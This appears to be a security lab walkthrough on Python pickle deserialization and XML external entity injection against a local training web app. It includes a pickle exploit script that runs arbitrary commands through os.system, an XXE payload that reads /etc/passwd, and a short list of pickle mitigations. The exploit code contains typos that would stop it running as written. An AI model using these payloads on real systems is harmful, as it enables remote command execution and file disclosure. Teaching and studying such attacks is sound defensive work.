# Code Execution

To see how pickle can be exploited, open a browser window and go to this url:
`http://192.168.1.101:5000

To view the source code of web, enter the following commands:
`cd Documents/lab/python-Code/vulnerabilities/
`nano pickle_vuln.py

The script below handles _base64-encoded_ pickled input. _Base64_ is an encoding scheme that represents binary data in an ASCII format. The if conditions check whether the user has entered any data in the input field on the website. The _OutputGrabber()_ is a custom class designed for displaying output appropriately.

The script demonstrates that the data is first decoded from _Base64_ and then unpickled using _pickle.loads()_. To exploit this implementation of the pickle module, the payload must first be pickled with _pickle.dump()_ and then encoded to Base64.

A script that serves this purpose can be found in the _/Documents_ directory. To view the contents of this script, please use the following commands:
`cd /home/kali/Documents/lab/
`cat exploit.py
```python
import pickle, sys, base64

DEFAULT_COMMAND = 'whoami'
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickelRce(object):
	def __reduce__(self):
		import os
		return (os.system, (COMMAND, ))

print(base64.b64encode(picke.dumps(PickleRce())))
```
# Pickle Load

The `COMMAND = sys.argv[1]` line is used so that different payloads can be pickled without having to change the script each time.

The '**reduce**' method returns the `(os.system,(COMMAND,))` tuple in which _os.system_ is the callable and COMMAND is the argument passed to the callable.

Lets use an example of the `os` module by using it to show our current user.
`python3 exploit.py whoami

Running the command shown below with pickle the _whoami_ command and output the encoded value in the terminal.
Copy the content between the single quoutes and paste it on the website.
# Pickle Mitigation

Clicking on _Send_ redirects the user to another page where a message indicating the _current user_ is displayed. This outcome demonstrates that all commands passed via _pickle.dumps()_ are executed with root permissions. A malicious actor could exploit this vulnerability to establish a remote connection and execute system commands.

Securing the pickle module is challenging because there is no effective way to escape or sanitize data before unpickling it. Any Python variable or module can be used as the callable, complicating efforts to validate user input effectively

Here are some best practices when working with pickle:

- Never unpickle data from untrusted sources.
- Transmit pickled data only through encrypted network connections to prevent malicious actors from intercepting or altering the information during transit.
- Utilize cryptographic signatures to sign the pickled data, enabling the recipient to verify that the information has not been tampered with..
- Consider switching to safer serialization formats, such as JSON.
# XML External Entity Attacks

_XML External Entity injection (XXE)_ is an attack that exploits weakly configured XML parsers that handle input files containing a reference to an external entity. XML files are favorable to use because of their self-explanatory and well-built construct. The consistency in the construct is achieved via Document Type Definition (DTD) files that contain information about the structure of XML files. The structure is defined using elements and attributes, of which the ENTITY elements are of particular interest. Entities define shortcuts to special characters that can be referenced by the XML file.

The XML file in this case would look like the following:
`<author>John Doe</author>`
### XML Payload

Entity referencing can be either internal or external, depending on whether they are defined inside or outside the _DTD_. When the entities are external, their content is referenced/added in the XML file. It is this content that can be modified to exploit the XML parsers and lead to XXE injections. If leveraged, this attack could lead to data disclosure, server-side request forgery, denial of service, and remote access control, among others.

Copy the XML payload and paste it into the input field of the website:

`<?xml version="1.0"?> <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`

Click on _Send_ to send the payload to the backend server.
